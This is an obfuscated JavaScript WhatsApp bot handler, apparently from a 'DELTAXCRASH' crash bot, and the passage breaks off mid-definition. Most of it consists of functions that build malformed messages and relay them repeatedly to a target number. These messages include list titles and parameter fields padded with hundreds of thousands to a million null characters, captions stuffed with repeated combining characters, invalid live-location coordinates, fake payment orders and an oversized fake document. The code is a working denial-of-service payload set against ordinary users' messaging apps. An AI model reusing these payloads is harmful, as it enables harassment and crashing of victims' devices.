module.exports = async (_0x38dbed, _0x44bc2a, _0xa35981) => {
  try {
    const _0x34976e = _0x44bc2a.mtype === "conversation" ? _0x44bc2a.message.conversation : _0x44bc2a.mtype == 'imageMessage' ? _0x44bc2a.message.imageMessage.caption : _0x44bc2a.mtype == 'videoMessage' ? _0x44bc2a.message.videoMessage.caption : _0x44bc2a.mtype == 'extendedTextMessage' ? _0x44bc2a.message.extendedTextMessage.text : _0x44bc2a.mtype == "interactiveResponseMessage" ? JSON.parse(_0x44bc2a.msg.nativeFlowResponseMessage.paramsJson).id : _0x44bc2a.mtype == 'buttonsResponseMessage' ? _0x44bc2a.message.buttonsResponseMessage.selectedButtonId : _0x44bc2a.mtype == "listResponseMessage" ? _0x44bc2a.message.listResponseMessage.singleSelectReply.selectedRowId : _0x44bc2a.mtype === 'interactiveResponseMessage' ? JSON.parse(_0x44bc2a.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : _0x44bc2a.mtype == "templateButtonReplyMessage" ? _0x44bc2a.message.templateButtonReplyMessage.selectedId : _0x44bc2a.mtype === "messageContextInfo" ? _0x44bc2a.message.buttonsResponseMessage?.["selectedButtonId"] || _0x44bc2a.message.listResponseMessage?.["singleSelectReply"]["selectedRowId"] || _0x44bc2a.text : '';
    const _0x1e8373 = JSON.parse(fs.readFileSync("./all/database/antilink.json"));
    const _0x1fb1e0 = JSON.parse(fs.readFileSync("./all/database/antilink2.json"));
    const _0x1572e5 = JSON.parse(fs.readFileSync('./all/database/premium.json'));
    const _0x18499e = JSON.parse(fs.readFileSync("./all/database/owner.json"));
    const _0x210452 = _0x1572e5.includes(_0x44bc2a.sender);
    const _0x11ed7f = JSON.parse(fs.readFileSync('./all/database/idgrup.json').toString());
    const _0x2010be = typeof _0x44bc2a.text == "string" ? _0x44bc2a.text : '';
    const _0x215af5 = _0x18499e.includes(_0x44bc2a.sender) ? true : _0x44bc2a.sender == owner + "@s.whatsapp.net" ? true : !!_0x44bc2a.fromMe;
    const _0x1eabdf = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(_0x34976e) ? _0x34976e.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : _0x215af5 && !_0x44bc2a.isBaileys ? '' : '.';
    const _0x3b6f08 = _0x34976e.startsWith(_0x1eabdf);
    const _0x19c9fe = _0x3b6f08 ? _0x34976e.slice(_0x1eabdf.length).trim().split(" ").shift().toLowerCase() : '';
    const _0x50dea1 = _0x1eabdf + _0x19c9fe;
    const _0x1f3af4 = _0x34976e.trim().split(/ +/).slice(0x1);
    const _0x443106 = _0x44bc2a.quoted ? _0x44bc2a.quoted : _0x44bc2a;
    const _0x5acaf7 = _0x44bc2a.key.remoteJid;
    const _0x1b3c99 = q = _0x1f3af4.join(" ");
    const _0xd62657 = await _0x38dbed.decodeJid(_0x38dbed.user.id);
    const _0x514477 = _0x44bc2a.chat.endsWith('@g.us');
    const _0x55c79c = _0x44bc2a.sender.split('@')[0x0];
    const _0xefbffe = _0x44bc2a.isGroup ? await _0x38dbed.groupMetadata(_0x44bc2a.chat)['catch'](_0x505c53 => {}) : {};
    let _0x1c40b0 = _0x44bc2a.isGroup ? _0xefbffe?.["participants"]["find"](_0x4ddfc5 => _0x4ddfc5.id == _0xd62657) : {};
    let _0x4e41ce = _0x44bc2a.isGroup ? _0xefbffe?.["participants"]["find"](_0x430cc0 => _0x430cc0.id == _0x44bc2a.sender) : {};
    const _0x4471f3 = !!(_0x1c40b0?.["admin"] !== null);
    const _0x2a38b6 = !!(_0x4e41ce?.["admin"] !== null);
    const {
      runtime: _0x44e5f5,
      getRandom: _0x36dc0a,
      getTime: _0x1f1b03,
      tanggal: _0x4544e6,
      telegraPh: _0x5b49e7,
      pinterest: _0x4a6b16,
      ucapan: _0x4fcfa2,
      generateProfilePicture: _0xb7b7a0,
      getBuffer: _0x3b2d42,
      fetchJson: _0x12b90a,
      resize: _0x3bf3f4
    } = require('./all/function.js');
    const {
      toAudio: _0x35d7a1,
      toPTT: _0x453591,
      toVideo: _0x526fb2,
      ffmpeg: _0x44b45a
    } = require("./all/converter.js");
    if (_0x3b6f08) {
      console.log(chalk.yellow.bgCyan.bold(namabot), color('Massage', 'yellow'), color("from", "white"), color('' + _0x55c79c, 'yellow'), color("Text :", "white"), color('' + _0x50dea1, "yellow"));
    }
    const _0x600e6e = {
      'key': {
        'participant': "0@s.whatsapp.net",
        ...(_0x44bc2a.chat ? {
          'remoteJid': "status@broadcast"
        } : {})
      },
      'message': {
        'interactiveMessage': {
          'header': {
            'hasMediaAttachment': true,
            'jpegThumbnail': fs.readFileSync("./DeltaNew/latx.png")
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': "review_and_pay",
              'buttonParamsJson': "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᷍ĐɆŁŦȺXȻɌȺSĦ👾╮⭑ ☠️⃰͜͡⚡ĐɆŁŦȺXȻɌȺSĦ᜴⚡ #ĐɆŁŦȺXȻɌȺSĦཀ͜͡👾⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const _0x3facec = {
      'key': {
        'participant': "0@s.whatsapp.net",
        ...(_0x44bc2a.chat ? {
          'remoteJid': "status@broadcast"
        } : {})
      },
      'message': {
        'interactiveMessage': {
          'header': {
            'hasMediaAttachment': true,
            'jpegThumbnail': fs.readFileSync('./DeltaNew/latx.png')
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'review_and_pay',
              'buttonParamsJson': "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️࿆᷍👾ĐɆŁŦȺXȻɌȺSĦ👾╮⭑ ☠️⃰͜ĐɆŁŦȺXȻɌȺSĦ᜴͡ #⃟ĐɆŁŦȺXȻɌȺSĦ⚡╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const _0x4d43fb = {
      'key': {
        'participant': "0@s.whatsapp.net",
        ...(_0x44bc2a.chat ? {
          'remoteJid': "status@broadcast"
        } : {})
      },
      'message': {
        'listResponseMessage': {
          'title': "𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦"
        }
      }
    };
    async function _0x1148a3(_0x29a37b, _0x531dea) {
      for (let _0x3c6402 = 0x0; _0x3c6402 < _0x531dea; _0x3c6402++) {
        _0x9c8dca(_0x29a37b);
        _0x236111(_0x29a37b);
        _0x27310b(_0x29a37b);
        await sleep(0x1f4);
      }
    }
    async function _0x1c844b(_0x167c65, _0x22bc2f) {
      var _0xb1c659 = generateWAMessageFromContent(_0x167c65, proto.Message.fromObject({
        'listMessage': {
          'title': "ĐɆŁŦȺXȻɌȺSĦ" + "\0".repeat(0xe09c0),
          'footerText': "✳️࿆᷍👾͆ĐɆŁŦȺXȻɌȺSĦ᜴̿╮⭑ ☠️⃰͜͡؜🥶🤡⃟👾ĐɆŁŦȺXȻɌȺSĦ᜴ཀ͜͡✨⃟╮.xd",
          'description': "✳️࿆᷍👾͆ĐɆŁŦȺXȻɌȺSĦ᜴̿╮⭑ ☠️⃰͜͡؜🤡🥶⃟👾ĐɆŁŦȺXȻɌȺSĦཀ͜͡✨⃟╮.xp",
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': 'anjay',
              'products': [{
                'productId': "439252450816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': "439252450816732",
              'jpegThumbnail': null
            },
            'businessOwnerJid': '0@s.whatsapp.net'
          }
        },
        'footer': "puki",
        'contextInfo': {
          'expiration': 0x93a80,
          'ephemeralSettingTimestamp': "1679959486",
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': "whatsapp",
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 0x2,
        'product_header_info': {
          'product_header_info_id': 0x4433e2e130,
          'product_header_is_rejected': false
        }
      }), {
        'userJid': _0x167c65,
        'quoted': _0x233a41
      });
      await _0x38dbed.relayMessage(_0x167c65, _0xb1c659.message, {
        'participant': {
          'jid': _0x167c65
        },
        'messageId': _0xb1c659.key.id
      });
    }
    async function _0x7b8e21(_0x2a2672, _0x2619ac) {
      var _0x243e6c = generateWAMessageFromContent(_0x2a2672, proto.Message.fromObject({
        'stickerMessage': {
          'url': "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
          'fileSha256': 'CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=',
          'fileEncSha256': "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
          'mediaKey': "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
          'mimetype': 'DeltaNew/webp',
          'directPath': "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          'fileLength': '10116',
          'mediaKeyTimestamp': "1715876003",
          'isAnimated': false,
          'stickerSentTs': "1715881084144",
          'isAvatar': false,
          'isAiSticker': false,
          'isLottie': false
        }
      }), {
        'userJid': _0x2a2672,
        'quoted': _0x2619ac
      });
      await _0x38dbed.relayMessage(_0x2a2672, _0x243e6c.message, {
        'participant': {
          'jid': _0x2a2672
        },
        'messageId': _0x243e6c.key.id
      });
    }
    async function _0x1606bb(_0x4b8f2e, _0x234bf3) {
      var _0xf5da0f = generateWAMessageFromContent(_0x4b8f2e, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "✳️࿆᷍ĐɆŁŦȺXȻɌȺSĦ᜴͆╮⭑ ☠️⃰͜͡⚡⃟👾᜴ĐɆŁŦȺXȻɌȺSĦཀ͜͡👾⃟╮.xp" + 'ꦾ'.repeat(0xc350),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x4b8f2e,
        'quoted': _0x234bf3
      });
      await _0x38dbed.relayMessage(_0x4b8f2e, _0xf5da0f.message, {
        'participant': {
          'jid': _0x4b8f2e
        },
        'messageId': _0xf5da0f.key.id
      });
    }
    async function _0x27310b(_0x53ee8d) {
      var _0x261be8 = generateWAMessageFromContent(_0x53ee8d, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'subtitle': " "
              },
              'body': {
                'text': '𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦̸'
              },
              'footer': {
                'text': 'xp'
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': 'cta_url',
                  'buttonParamsJson': "{ display_text : '𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦', url : , merchant_url :  }"
                }],
                'messageParamsJson': "\0".repeat(0xf4240)
              }
            }
          }
        }
      }), {
        'userJid': _0x53ee8d
      });
      await _0x38dbed.relayMessage(_0x53ee8d, _0x261be8.message, {
        'participant': {
          'jid': _0x53ee8d
        },
        'messageId': _0x261be8.key.id
      });
    }
    async function _0x11fb06(_0x4db377, _0x36cb45) {
      var _0x3c4c91 = generateWAMessageFromContent(_0x4db377, proto.Message.fromObject({
        'interactiveMessage': {
          'header': {
            'title': "𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦",
            'hasMediaAttachment': true,
            ...(await prepareWAMessageMedia({
              'image': {
                'url': "https://telegra.ph/file/14421142a4e58f13a29f2.jpg"
              }
            }, {
              'upload': _0x38dbed.waUploadToServer
            }))
          },
          'body': {
            'text': ''
          },
          'footer': {
            'text': "›          #𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦"
          },
          'nativeFlowMessage': {
            'messageParamsJson': "\0".repeat(0xf4240)
          }
        }
      }), {
        'userJid': _0x4db377,
        'quoted': _0x36cb45
      });
      await _0x38dbed.relayMessage(_0x4db377, _0x3c4c91.message, {
        'participant': {
          'jid': _0x4db377
        },
        'messageId': _0x3c4c91.key.id
      });
    }
    async function _0x4b4561(_0x281980, _0x4d782e) {
      var _0x46a6a4 = generateWAMessageFromContent(_0x281980, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "✳️᜴࿆͆᷍𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦╮⭑ ☠️⃰͜͡؜𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦👾᜴▴𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦⃟╮.xp" + 'ꦾ'.repeat(0xc350),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x281980,
        'quoted': _0x4d782e
      });
      await _0x38dbed.relayMessage(_0x281980, _0x46a6a4.message, {
        'participant': {
          'jid': _0x281980
        },
        'messageId': _0x46a6a4.key.id
      });
    }
    async function _0x29d677(_0x7f678c, _0x45dfb8) {
      for (let _0x1609d9 = 0x0; _0x1609d9 < _0x45dfb8; _0x1609d9++) {
        let _0x16a0e0 = generateWAMessageFromContent(_0x7f678c, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 0x2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': ''
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': ''
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': '',
                  'subtitle': '',
                  'hasMediaAttachment': false
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [{
                    'name': "cta_url",
                    'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
                  }],
                  'messageParamsJson': "\0".repeat(0x186a0)
                })
              })
            }
          }
        }, {});
        _0x38dbed.relayMessage(_0x7f678c, _0x16a0e0.message, {
          'messageId': _0x16a0e0.key.id
        });
      }
    }
    async function _0x236111(_0x4087e7) {
      var _0xb1ba04 = generateWAMessageFromContent(_0x4087e7, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "Ø𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦„Ù½Ø‚Ù†ØƒØ„Ù½" + "ê¦¾".repeat(0xc350),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x4087e7
      });
      await _0x38dbed.relayMessage(_0x4087e7, _0xb1ba04.message, {
        'participant': {
          'jid': _0x4087e7
        },
        'messageId': _0xb1ba04.key.id
      });
    }
    async function _0x9c8dca(_0x908ce7) {
      var _0x30b98b = generateWAMessageFromContent(_0x908ce7, proto.Message.fromObject({
        'listMessage': {
          'title': "𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" + "\0".repeat(0xe09c0),
          'footerText': "𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
          'description': "𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': "lol",
              'products': [{
                'productId': "4392524570816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': "4392524570816732",
              'jpegThumbnail': null
            },
            'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': "lol",
        'contextInfo': {
          'expiration': 0x927c0,
          'ephemeralSettingTimestamp': '1679959486',
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': "whatsapp",
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': 'INITIATED_BY_ME'
          }
        },
        'selectListType': 0x2,
        'product_header_info': {
          'product_header_info_id': 0x4433e2e130,
          'product_header_is_rejected': false
        }
      }), {
        'userJid': _0x908ce7
      });
      await _0x38dbed.relayMessage(_0x908ce7, _0x30b98b.message, {
        'participant': {
          'jid': _0x908ce7
        },
        'messageId': _0x30b98b.key.id
      });
    }
    async function _0x4099ba(_0x2e136e, _0x43054e) {
      for (let _0x257065 = 0x0; _0x257065 < _0x43054e; _0x257065++) {
        _0x236111(_0x2e136e);
        _0x9c8dca(_0x2e136e);
        await sleep(0x1f4);
      }
    }
    function _0x2562c6(_0x1c7ad3, _0x279985 = [], _0xb542c5 = false) {
      return _0xb542c5 == null || _0xb542c5 == undefined || _0xb542c5 == false ? _0x38dbed.sendMessage(_0x44bc2a.chat, {
        'text': _0x1c7ad3,
        'mentions': _0x279985
      }, {
        'quoted': _0x44bc2a
      }) : _0x38dbed.sendMessage(_0x44bc2a.chat, {
        'text': _0x1c7ad3,
        'mentions': _0x279985
      }, {
        'quoted': _0x44bc2a
      });
    }
    async function _0x216f83(_0x133d8e, _0x139d3f) {
      var _0x25ad41 = generateWAMessageFromContent(_0x133d8e, proto.Message.fromObject({
        'listMessage': {
          'title': "𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦 ⿻ 𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦々" + "\0".repeat(0xe09c0),
          'footerText': "✳️᜴࿆͆᷍𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦╮⭑ ☠️⃰͜𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒͡؜᜴▴𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒⃟╮.xp",
          'description': "✳️᜴࿆͆᷍𝗗𝝨𝗟𝝩𝝙𝝯𝝞𝝘𝗨𝗦╮⭑ ☠️⃰͜͡؜𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒᜴▴𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒╮.xp",
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': "anjay",
              'products': [{
                'productId': "4392524570816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': "4392524570816732",
              'jpegThumbnail': null
            },
            'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': "puki",
        'contextInfo': {
          'expiration': 0x93a80,
          'ephemeralSettingTimestamp': "1679959486",
          'entryPointConversionSource': 'global_search_new_chat',
          'entryPointConversionApp': "whatsapp",
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 0x2,
        'product_header_info': {
          'product_header_info_id': 0x4433e2e130,
          'product_header_is_rejected': false
        }
      }), {
        'userJid': _0x133d8e,
        'quoted': _0x4d43fb
      });
      await _0x38dbed.relayMessage(_0x133d8e, _0x25ad41.message, {
        'participant': {
          'jid': _0x133d8e
        },
        'messageId': _0x25ad41.key.id
      });
    }
    async function _0x28a511(_0x22727e) {
      await _0x38dbed.relayMessage(_0x22727e, {
        'paymentInviteMessage': {
          'serviceType': "FBPAY",
          'expiryTimestamp': Date.now() + 0x6c258c00
        }
      }, {
        'participant': {
          'jid': _0x22727e
        }
      });
    }
    async function _0x4de787(_0x46fc8d, _0x14d1f3) {
      var _0x3f1c9c = generateWAMessageFromContent(_0x46fc8d, proto.Message.fromObject({
        'documentMessage': {
          'url': "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          'mimetype': 'penis',
          'fileSha256': "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          'fileLength': "999999999",
          'pageCount': 0x3b9ac9ff,
          'mediaKey': "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          'fileName': "✳️᜴࿆͆᷍𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒╮⭑ ☠️⃰͜͡؜𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒᜴▴𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒╮.👾" + 'ྦྷ'.repeat(0xea60),
          'fileEncSha256': "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          'directPath': "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
          'mediaKeyTimestamp': '1715880173'
        }
      }), {
        'userJid': _0x46fc8d,
        'quoted': _0x14d1f3
      });
      await _0x38dbed.relayMessage(_0x46fc8d, _0x3f1c9c.message, {
        'participant': {
          'jid': _0x46fc8d
        },
        'messageId': _0x3f1c9c.key.id
      });
    }
    async function _0x463f63(_0x3fd85, _0x5184f8) {
      var _0x3de40a = generateWAMessageFromContent(_0x3fd85, proto.Message.fromObject({
        'interactiveMessage': {
          'header': {
            'title': '✨⃟༑⌁⃰𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒ཀ͜͡🦠',
            'hasMediaAttachment': true,
            ...(await prepareWAMessageMedia({
              'image': {
                'url': 'https://telegra.ph/file/14421142a4e58f13a29f2.jpg'
              }
            }, {
              'upload': _0x38dbed.waUploadToServer
            }))
          },
          'body': {
            'text': ''
          },
          'footer': {
            'text': "›          #𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒"
          },
          'nativeFlowMessage': {
            'messageParamsJson': "\0".repeat(0xf4240)
          }
        }
      }), {
        'userJid': _0x3fd85,
        'quoted': _0x5184f8
      });
      await _0x38dbed.relayMessage(_0x3fd85, _0x3de40a.message, {
        'participant': {
          'jid': _0x3fd85
        },
        'messageId': _0x3de40a.key.id
      });
    }
    async function _0x156efb(_0x3648e3, _0xb80929) {
      var _0x482a71 = generateWAMessageFromContent(_0x3648e3, proto.Message.fromObject({
        'stickerMessage': {
          'url': 'https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true',
          'fileSha256': "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
          'fileEncSha256': "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
          'mediaKey': "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
          'mimetype': 'DeltaNew/webp',
          'directPath': "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          'fileLength': '10116',
          'mediaKeyTimestamp': "1715876003",
          'isAnimated': false,
          'stickerSentTs': '1715881084144',
          'isAvatar': false,
          'isAiSticker': false,
          'isLottie': false
        }
      }), {
        'userJid': _0x3648e3,
        'quoted': _0xb80929
      });
      await _0x38dbed.relayMessage(_0x3648e3, _0x482a71.message, {
        'participant': {
          'jid': _0x3648e3
        },
        'messageId': _0x482a71.key.id
      });
    }
    const _0x157e42 = {
      'key': {
        'participant': "0@s.whatsapp.net",
        ...(_0x44bc2a.chat ? {
          'remoteJid': 'status@broadcast'
        } : {})
      },
      'message': {
        'interactiveMessage': {
          'header': {
            'hasMediaAttachment': true,
            'jpegThumbnail': fs.readFileSync("./DeltaNew/latx.png")
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'review_and_pay',
              'buttonParamsJson': "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒╮⭑ ☠️⃰͜͡؜𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒👾᜴ # 𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒🥶⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const _0x3a1c14 = async _0x45abef => {
      _0x38dbed.sendMessage(_0x44bc2a.chat, {
        'react': {
          'text': _0x45abef,
          'key': _0x44bc2a.key
        }
      });
    };
    const _0x44d4d0 = {
      'key': {
        'participant': "0@s.whatsapp.net",
        ...(_0x44bc2a.chat ? {
          'remoteJid': "status@broadcast"
        } : {})
      },
      'message': {
        'interactiveMessage': {
          'header': {
            'hasMediaAttachment': true,
            'jpegThumbnail': fs.readFileSync("./DeltaNew/latx.png")
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': "review_and_pay",
              'buttonParamsJson': "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒╮⭑ ☠️⃰͜͡؜𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒👾᜴ # 𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒👾⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const _0x233a41 = {
      'key': {
        'participant': '0@s.whatsapp.net',
        ...(_0x44bc2a.chat ? {
          'remoteJid': "status@broadcast"
        } : {})
      },
      'message': {
        'listResponseMessage': {
